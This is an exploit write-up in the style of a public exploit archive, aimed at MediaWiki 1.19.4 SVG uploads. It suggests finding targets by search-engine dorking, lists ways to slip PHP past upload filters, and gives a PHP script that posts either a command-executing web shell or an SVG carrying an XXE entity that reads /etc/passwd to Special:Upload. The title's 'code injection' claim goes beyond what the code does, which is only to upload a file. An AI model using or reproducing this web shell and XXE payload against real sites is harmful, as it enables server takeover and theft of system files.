=============================================================================================================================================
| # Title     : MediaWiki SVG 1.19.4 PHP Code Injection Vulnerability                                                                       |
| # Author    : indoushka                                                                                                                   |
| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 135.0.1 (64 bits)                                                            |
| # Vendor    : https://www.mediawiki.org/wiki/SVG                                                                                          |
=============================================================================================================================================

POC :

[+] Dorking İn Google Or Other Search Enggine.

[+] Code Description: The code contains uploading SVG files to Code XML Entity Expansion to exploit a vulnerability in MediaWiki. This allows the files to be read from the target.

    You cannot upload a PHP file directly using this exploit because MediaWiki does not allow uploading PHP files as a security measure, 
	
	it only allows uploading SVG and other specific files according to its settings.However, there are some possible ways:

    Upload a PHP file disguised as SVG

    Some systems may allow uploading a PHP file by adding the .svg.php extension or using MIME Type spoofing.But in most cases, MediaWiki will filter out incompatible files.

    Uploading an SVG file containing hidden PHP code
	
    Sometimes PHP code can be inserted into XML and exploit a file parsing bug (on some older servers).

    Exploiting another vulnerability to upload PHP files
	
   If you can exploit a bug in MediaWiki or the server settings (such as misconfigured Apache/Nginx) you may be able to upload a PHP file.

   Uploading a PHP file with a different extension and then exploiting it
   
   Some applications allow you to upload files that contain PHP code but with a different extension (such as .phps, .php3, .phtml).
   
   If there is an error in the server settings, it may be interpreted as PHP code when it is run. 
   
   The code tries to upload a PHP file if the server accepts it. I add an option that allow you to specify the type of file to upload (SVG or PHP) based on the server response.
	
	( Related : https://packetstorm.news/files/id/181137/  Related CVE Numbers: )
	
[+] save code as poc.php.

[+] Set Target : line 46

[+] USage : php poc.php 

[+] PayLoad :

<?php

function upload_file($target_uri, $file_type) {
    $filename = "exploit." . strtolower($file_type);

    // محتوى الملف بناءً على النوع
    if ($file_type === 'php') {
        $file_content = <<<PHP
<?php system(\$_GET['cmd']); ?>
PHP;
    } else {
        $file_content = <<<SVG
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM 'file:///etc/passwd'>
]>
<svg xmlns='http://www.w3.org/2000/svg'>
    <text>&xxe;</text>
</svg>
SVG;
    }

    // إعداد بيانات POST لرفع الملف
    $boundary = uniqid();
    $post_data = "--$boundary\r\n";
    $post_data .= "Content-Disposition: form-data; name=\"wpUploadFile\"; filename=\"$filename\"\r\n";
    $post_data .= "Content-Type: application/octet-stream\r\n\r\n";
    $post_data .= $file_content . "\r\n";
    $post_data .= "--$boundary--\r\n";

    // إرسال الطلب باستخدام cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $target_uri . "/index.php/Special:Upload");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: multipart/form-data; boundary=$boundary"]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code == 302) {
        echo "[+] File uploaded successfully: $filename\n";
    } else {
        echo "[-] Failed to upload file\n";
    }
}

// استخدام الدالة
$target_uri = "http://example.com/mediawiki";
$file_type = "svg"; // يمكن تغييره إلى "php"
upload_file($target_uri, $file_type);

?>



Greetings to :=====================================================================================
jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
===================================================================================================